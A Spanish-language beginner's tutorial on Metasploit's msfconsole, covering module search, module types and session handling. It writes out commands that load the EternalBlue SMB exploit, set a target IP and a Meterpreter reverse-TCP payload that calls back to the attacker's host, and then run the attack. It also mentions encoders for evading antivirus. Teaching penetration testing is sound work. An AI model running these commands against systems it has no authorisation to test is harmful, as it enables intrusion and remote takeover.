## 🔥 **¿Qué es `msfconsole` en Metasploit?**

`msfconsole` es la **interfaz principal** de **Metasploit Framework (MSF)**, una herramienta de pentesting que permite realizar ataques, explotación de vulnerabilidades, post-explotación y mucho más.

Es el **corazón de Metasploit**, ya que desde aquí puedes: ✅ Escanear redes y enumerar servicios.  
✅ Buscar y ejecutar exploits.  
✅ Cargar payloads para tomar control de un sistema.  
✅ Usar módulos auxiliares para escaneo, fuerza bruta, etc.  
✅ Administrar sesiones con `meterpreter`.

---

## 🚀 **Cómo iniciar `msfconsole`**

Para abrir `msfconsole`, simplemente ejecuta en la terminal:

`msfconsole`

Después de cargar, verás el prompt de Metasploit:

`msf >`

Desde aquí puedes ejecutar comandos para interactuar con los módulos y herramientas de Metasploit.

---

## 🛠️ **Comandos Básicos en `msfconsole`**

### 🔹 **1. Buscar exploits y módulos**

`search windows search smb search exploit android`

💡 **Filtra por tipo de exploit, servicio o sistema operativo**.

---

### 🔹 **2. Usar un módulo**

`use exploit/windows/smb/ms17_010_eternalblue`

💡 **Carga el exploit para atacar una vulnerabilidad en SMB**.

---

### 🔹 **3. Mostrar información sobre un módulo**

`info exploit/windows/smb/ms17_010_eternalblue`

💡 **Ver detalles del exploit, puertos, requisitos, opciones configurables**.

---

### 🔹 **4. Configurar opciones de un módulo**

`set RHOSTS 192.168.1.100 set LHOST 192.168.1.50 set PAYLOAD windows/meterpreter/reverse_tcp`

💡 **Define la IP del objetivo (`RHOSTS`) y tu IP (`LHOST`)**.

---

### 🔹 **5. Ejecutar un exploit**

`exploit`

o

`run`

💡 **Ejecuta el ataque con la configuración establecida**.

---

### 🔹 **6. Mostrar sesiones activas**

`sessions -l`

💡 **Lista sesiones activas si lograste comprometer un sistema**.

---

### 🔹 **7. Conectarse a una sesión `meterpreter`**

`sessions -i 1`

💡 **Interactúa con la sesión número 1 (puede variar)**.

---

## 📌 **Estructura de Metasploit (`msfconsole`)**

Metasploit tiene diferentes **tipos de módulos**, y `msfconsole` permite administrarlos todos:

| Tipo          | Descripción                                             |
| ------------- | ------------------------------------------------------- |
| **Exploit**   | Código que aprovecha una vulnerabilidad en un sistema.  |
| **Payload**   | Código ejecutado tras la explotación (ej. Meterpreter). |
| **Auxiliary** | Módulos que ayudan en escaneo, enumeración, etc.        |
| **Post**      | Módulos para mantener acceso o extraer información.     |
| **Encoders**  | Ofuscan payloads para evadir antivirus.                 |
| **Nops**      | Relleno para evitar detección en exploits.              |